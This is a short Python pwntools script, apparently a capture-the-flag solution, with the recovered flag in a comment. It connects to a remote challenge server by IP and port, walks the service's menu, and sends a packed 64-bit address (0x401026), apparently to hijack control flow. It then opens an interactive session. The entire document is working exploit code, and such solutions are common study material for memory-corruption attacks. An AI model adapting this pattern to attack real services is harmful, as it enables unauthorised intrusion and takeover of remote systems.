from pwn import *
# flag{The 0n1y way t0 hav3 friends is t0 be one3 :)}
s = remote('110.10.147.28', 7179)
s.recvuntil('>')
s.sendline('1')
s.recvuntil('>')
s.sendline('1')
s.recvuntil('?')
s.sendline(p64(0x000401026))
s.recvuntil('>')
s.sendline('2')
s.recvuntil(':')
s.sendline('0')
s.recvuntil(':')
s.sendline('Lion')
s.interactive()
